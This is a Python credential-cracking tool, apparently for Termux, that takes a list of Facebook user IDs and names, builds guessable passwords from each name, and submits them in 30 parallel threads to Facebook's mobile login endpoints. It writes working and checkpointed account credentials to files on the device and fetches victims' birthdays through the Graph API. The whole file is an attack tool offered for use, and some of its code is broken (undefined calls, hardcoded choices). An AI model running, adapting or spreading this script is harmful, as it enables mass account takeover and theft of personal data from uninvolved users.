#SC MAKED BY JISAN
#ENC X1X4D-2-0 
#JISAN Your Reyal Pappa

exec("""\nimport os\ntry:\n    import requests\nexcept ImportError:\n    print('\\n Module requests !...\\n')\n    os.system('pip install requests')\n \ntry:\n    import concurrent.futures\nexcept ImportError:\n    print('\\n Module futures !...\\n')\n    os.system('pip install futures')\n \ntry:\n    import bs4\nexcept ImportError:\n    print('\\n Module bs4 !...\\n')\n    os.system('pip install bs4')\n \nimport requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid\nfrom concurrent.futures import ThreadPoolExecutor as KINGNASEER\nfrom datetime import datetime\nfrom bs4 import BeautifulSoup\n \n \nct = datetime.now()\nn = ct.month\nbulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']\ntry:\n    if n < 0 or n > 12:\n        exit()\n    nTemp = n - 1\nexcept ValueError:\n    exit()\n \ncurrent = datetime.now()\nta = current.year\nbu = current.month\nha = current.day\nop = bulan[nTemp]\n### WARNA RANDOM ###\nP = '\\x1b[1;97m' # PUTIH\nM = '\\x1b[1;91m' # MERAH\nH = '\\x1b[1;92m' # HIJAU\nK = '\\x1b[1;93m' # KUNING\nB = '\\x1b[1;94m' # BIRU\nU = '\\x1b[1;95m' # UNGU\nO = '\\x1b[1;96m' # BIRU MUDA\nN = '\\x1b[0m'    # WARNA MATI\nmy_color = [\n P, M, H, K, B, U, O, N]\nwarna = random.choice(my_color)\n#  CHIGOZIEWORLDWIDE.  #\n#------------------------------->\n \n############################ RESPONSE FACEBOOK ###########################################\ndata,data2={},{}\naman,cp,salah=0,0,0\nubahP,pwBaru=[],[]\nok = []\ncp = []\nid = []\nuser = []\nloop = 0\nurl_lookup = "https://lookup-id.com/"\nurl_mb = "https://m.facebook.com"\nurl_ip = "https://www.httpbin.org/ip"\nheader_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]"}\nbulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}\n###########################################################################################\ndone = False\ndef animate():\n    os.system("clear")\n    for c in itertools.cycle(['\\x1b[1;92m|', '\\x1b[1;92m/', '\\x1b[1;92m-', '\\x1b[1;92m\\\\']):\n        if done:\n            break\n        sys.stdout.write(f'\\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)\n        sys.stdout.write(f'\\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)\n        sys.stdout.write(f'\\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)\n        sys.stdout.write(f'\\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)\n        sys.stdout.write(f'\\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)\n        sys.stdout.flush()\n        time.sleep(0.03)\nt = threading.Thread(target=animate)\nt.start()\n\ndone = True\n \n# lempankkkkkkkk\ndef jalan(z):\n    for e in z + '\\n':\n        sys.stdout.write(e)\n        sys.stdout.flush()\n        \n \n# LO KONTOL\ndef logo():\n	print(\"\"\"\n \n      ######## \\033[1;97m##     ## \\033[1;92m########\n         ##    \\033[1;97m##     ## \\033[1;92m##\n         ##    \\033[1;97m##     ## \\033[1;92m##\n         ##    \\033[1;97m######### \\033[1;92m######\n         ##    \\033[1;97m##     ## \\033[1;92m##\n         ##    \\033[1;97m##     ## \\033[1;92m##\n         ##    \\033[1;97m##     ## \\033[1;92m########\n         \n         \n\\033[0;93m░█▀▄░█░░░█▀█░█▀▀░█░█░░░█▀▀░█░█░█▀█░█▀▀░▀█▀░░\n\\033[0;93m░█▀▄░█░░░█▀█░█░░░█▀▄░░░█░█░█▀█░█░█░▀▀█░░█░░░\n\\033[0;93m░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░░\n \n==================================================\n           CODED BY : HAMIM UDDIN JISAN        \n           WHATSAPP : +8801814649133    \n           FB PAGE  : ITZ JISAN   \n==================================================           \n              \\x1b[1;41m\\x1b[1;97mX1X4D-2-0 BR4ND \\x1b[1;0m\"\"\")\n \ndef reg():\n    os.system('clear')\n    logo()\n    print ('')\n    \n    try:\n        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()\n    except (KeyError, IOError):\n        reg2()\n    r = requests.get('https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt').text\n    if to in r:\n        \n        python_java()\n    else:\n        os.system('clear')\n        logo()\n        print('')\n        print ('\\tApproved Not Detected')\n        print ('')\n        print (' \\033[1;97mToken: ' + to)\n        print(' Facebook : Itz Jisan Xhowdhury')\n        input('\\033[1;97m Press Enter To Get Approval \\033[1;92m(FOR FREE)')\n        os.system("xdg-open https://www.facebook.com/TurRealabbu1")\n        reg()\n \ndef reg2():\n    os.system('clear')\n    logo()\n    print('')\n    print ('\\tApproval Not Detected')\n    print('')\n    id = uuid.uuid4().hex[:50]\n    print (' Token : ' + id)\n    print(' Facebook : pompomLover')\n    input(' Press Enter To Get Approval \\033[1;92m(FOR FREE) ')\n    os.system("xdg-open https://www.facebook.com/groups/itz.jisan.termux.zone/")\n    sav = open('/sdcard/Android/.bs7nt.txt', 'w')\n    sav.write(id)\n    sav.close()\n    reg()\n \n \n \n#MASUK TOKEN\ndef THEMOHSIN (OK,cp):\n    if len(OK) != 0 or len(cp) != 0:\n        print('\\n----------------------------------------------')\n        print(' Crack Has Been Completed.')\n        print('----------------------------------------------')\n        print(' [%s+%s] \\033[1;92m SUCCESSFULL : %s --- \\033[1;97m/sdcard/JISAN-OK.txt'%(O,O,str(len(ok))))\n        print(' [%s+%s] \\033[1;92m CHECKPOINTS : %s --- \\033[1;97m/sdcard/JISAN-Cp.txt'%(O,O,str(len(cp))))\n        print('----------------------------------------------')\n        input(f"\\n\\033[1;97m Press Enter To Return To Main Menu ")\n        python_java()\n \ndef python_java():\n    os.system('clear')\n    logo()\n    ipm = requests.get(url_ip).json() \n    IP = ipm["origin"]\n    print(" \\033[1;95m ---------------------------------------------")\n    print(" \\033[1;92m               B L 4 C K G H O S T")\n    print(" \\033[1;95m ---------------------------------------------")\n    print(" \\033[1;97m IP ADDRESS        [%s]\\n"%(IP))\n    print(" \\033[1;97m ---------------------------------------------")\n    print(" \\033[1;94m             Dont Play With Me !")\n    print(" \\033[1;94m             Because I know I Can")\n    print(" \\033[1;94m                PLAY Better Than You")\n    print(" \\033[1;97m ---------------------------------------------")\n    print("\\033[1;97m [1] FILE CRACK")\n    print("\\033[1;91m [0] EXIT")\n    print("")\n    pepek = input('\\033[1;97m Select : ')\n    if pepek in['1','01']:\n       __xyz__().janu(id)\n            \n \nclass __xyz__:\n \n    def __init__(self):\n        self.id = []\n \n    def janu(self,id):\n        os.system('clear')\n        logo()\n        print(" \\033[1;97m ---------------------------------------------")\n        print("              FILE CRACK MENU")\n        print(" \\033[1;97m ---------------------------------------------")\n        print('')\n        self.cnt = input('%s  ENTER FILE PATH :%s '%(P,K))\n        self.id = open(self.cnt).read().splitlines()\n        os.system('clear')\n        logo()\n        input('%s  Press ENTER IF YOU WANT TO COUNTINUE PROCESS :%s '%(P,K))\n        ___worldwide___ = ('y')\n        if ___worldwide___ in ('yes','Yes','Y', 'y'):\n            os.system('clear')\n            logo()\n            print(" \\033[1;97m ---------------------------------------------")\n            print("\\033[1;91              SELECT METHOD")\n            print(" \\033[1;92m ---------------------------------------------")\n            print('')\n            print(' [1] Method 1 (Best)')\n            print(' [2] Method 2 (Fire)')\n            chi = input('  Choose method: ')\n            self.__pler__()\n        else:\n            print(' WRONG INPUT ');self.janu(id)\n    def __metode__(self, user, __chi__, chachaji):\n        global ok,cp,loop\n        sys.stdout.write(f'\\r [BL4CK GHOST] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),\n        sys.stdout.flush()\n        try:\n            for pw in __chi__:\n                pw = pw.lower()\n                session=requests.Session()\n                header = {\n                    "Host":chachaji,\n                    "upgrade-insecure-requests":"1",\n                    "user-agent":"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/534.13",\n                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",\n                    "dnt":"1",\n                    "x-requested-with":"mark.via.gp",\n                    "sec-fetch-site":"same-origin",\n                    "sec-fetch-mode":"cors",\n                    "sec-fetch-user":"empty",\n                    "sec-fetch-dest":"document",\n                    "referer":"https://m.facebook.com/",\n                    "accept-encoding":"gzip, deflate br",\n                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"\n                }\n                r = session.get(f"https://{chachaji}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)\n                das = {\n                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),\n                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),\n                    "uid":user,\n                    "flow":"login_no_pin",\n                    "pass":pw,\n                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"\n                }\n                header1 = {\n                    "Host":chachaji,\n                    "cache-control":"max-age=0",\n                    "upgrade-insecure-requests":"1",\n                    "origin":"https://"+chachaji,\n                    "content-type":"application/x-www-form-urlencoded",\n                    "user-agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36",\n                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",\n                    "x-requested-with":"XMLHttpRequest",\n                    "sec-fetch-site":"same-origin",\n                    "sec-fetch-mode":"cors",\n                    "sec-fetch-user":"empty",\n                    "sec-fetch-dest":"document",\n                    "referer":"https://"+chachaji+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",\n                    "accept-encoding":"gzip, deflate br",\n                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"\n                }\n                po = session.post(f"https://{chachaji}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)\n                if 'c_user' in session.cookies.get_dict():\n                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])\n                    print(f'\\r{H} [JISAN-OK] {user} | {pw}')\n                    wrt = '%s|%s' % (user,pw)\n                    ok.append(wrt)\n                    open('/sdcard/JISAN-OK.txt' , 'a').write('%s\\n' % wrt)\n                    self.follow(session,coki)\n                    break\n                elif 'checkpoint' in session.cookies.get_dict():\n                    try:\n                        tokenz = open('.token.txt').read()\n                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']\n                        month, day, year = cp_ttl.split('/')\n                        month = bulan_ttl[month]\n                        print('\\r%s \\033[1;94m[JISAN-Cp] %s | %s ' % (K,user,pw))\n                        wrt = '%s|%s' % (user,pw)\n                        cp.append(wrt)\n                        open('/sdcard/JISAN-Cp.txt' , 'a').write('%s\\n' % wrt)\n                        break\n                    except (KeyError, IOError):\n                        month = ''\n                        day   = ''\n                        year  = ''\n                    except:pass\n                    print('\\r%s \\033[1;94m[JISAN-Cp] %s | %s ' % (K,user,pw))\n                    wrt = '%s|%s' % (user,pw)\n                    cp.append(wrt)\n                    open('/sdcard/JISAN-Cp.txt' , 'a').write('%s\\n' % wrt)\n                    break\n                else:\n                    continue\n \n            loop+=1\n        except:\n            self.__metode__(user, pw, chachaji)\n    def __pler__(self):\n        chi = ('2')\n        if chi == '':\n            print('\\nSelect Correct One');self.__pler__()\n        elif chi in ('1', '01'):\n            os.system('clear')\n            logo()\n            print('')\n            print(' \\033[1;49;39m TOTAL IDZ : %s%s' %(len(self.id),O))\n            print(' \\033[1;93m USE FLIGHT MODE IF SPEED ARE SLOW ')\n            print(' \\033[1;92m IN THE BACKGROUND ')\n            print('-------------------------------------------')\n            print('')\n            with KINGNASEER(max_workers=30) as kirim:\n                for thankme in self.id: # Yo Ndak Tau Kok Tanya Saia\n                    try:\n                        uid, name = thankme.split('|')\n                        xz = name.split(' ')\n                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:\n                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]\n                        else:\n                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]\n                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")\n                    except:\n                        pass\n \n            BL4CK-GHOST(OK,cp)\n        elif chi in ('2', '02'):\n \n            os.system('clear')\n            logo()\n            print('')\n            print(" \\033[1;97m ---------------------------------------------")\n            print(' \\033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))\n            print(' \\033[1;91m USE FLIGHT MODE IF SPEED ARE SELOW')\n            print(' \\033[1;92m CRACK HAS BEEN STARTED')\n            print(" \\033[1;97m ---------------------------------------------")\n            print('')\n            with KINGNASEER(max_workers=30) as kirim:\n                for thankme in self.id: # CHECK_THE_POWER_OF_YOUR_DAD_JISAN\n                    try:\n                        uid, name = thankme.split('|')\n                        xz = name.split(' ')\n                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:\n                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]\n                        else:\n                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]\n                        kirim.submit(self.__metode__, uid, pwx, "x.facebook.com")\n                    except:\n                        pass\n \n            BL4CK-GHOST(OK,cp)\n        else:\n            print('\\n Select Valid One');self.__pler__()\n \n \nif __name__ == '__main__':\n    reg()\n""")